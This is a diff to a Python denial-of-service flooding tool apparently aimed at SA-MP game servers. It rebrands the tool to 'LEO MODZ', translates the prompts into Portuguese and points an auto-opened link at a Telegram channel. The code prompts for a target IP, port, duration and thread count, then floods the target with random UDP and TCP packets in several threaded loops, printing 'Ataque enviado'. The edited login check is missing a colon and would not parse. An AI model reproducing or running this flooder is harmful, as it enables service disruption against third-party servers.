@@ -8,10 +8,10 @@ import time
 
 ###### MESSAGE MIKA ON TOP! #####
 os.system("clear")
-os.system("xdg-open https://discord.gg/8gmRVnRRwV")
+os.system("xdg-open https://t.me/LEOMODZOFC")
 print("\u001b[35m Welcome to SAMP-NUDOS World")
 time.sleep(2)
-print("Loading.......")
+print("CARREGANDO......")
 os.system("clear")
 
 #### Login       
@@ -19,31 +19,31 @@ os.system("clear")
 attemps = 0
 
 while attemps < 100:
-    username = input('Enter your username: ')
-    password = input('Enter your password: ')
+    username = input('Digite seu nome de usuário: ')
+    password = input('Digite sua senha: ')
 
-    if username == 'NUDOS' and password == 'NUDOS':
-        print('You have successfully logged in Welcome to NUDOS!!')
+    if username == 'LEO' and password == 'MODZ'
+        print('LOGADO COM SUCESSO BEM-VINDO LEO MODZ!!')
         break
     else:
-        print('Incorrect credentials. Check if you have Caps lock on and try again.')
+        print('CREDENCIAIS INCORRETAS. VERIFIQUE SE VOCÊ TEM CAPS LOCK ATIVADO E TENTE NOVAMENTE.')
         attemps += 1
         continue
 os.system("clear")
 
 print("""
 \u001b[35m
-	  AUTHOR TOOLS : SAMP NUDOS
+	  DDOS SAMP TOOLS : LEO MODZ
 	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
 	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
 	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
 """)
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
+ip = str(input(" IP :"))
+port = int(input(" PORTA :"))
 choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+times = int(input(" TEMPO :"))
+threads = int(input(" TÓPICOS :"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -53,9 +53,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque enviado!!!")
 		except:
-			print("[!] Error!!!")
+			print("[!] Erro!!!")
 
 def run2():
 	data = random._urandom(999)
@@ -67,10 +67,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque enviado!!!")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("[*] Erro!!!")
             
 
 def run3():
@@ -83,10 +83,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque enviado!!!")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("[*] Erro!!!")
             
   
 def run4():
@@ -99,10 +99,10 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque enviado!!!")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("[*] Erro!!!")
 											
             
 for y in range(threads):
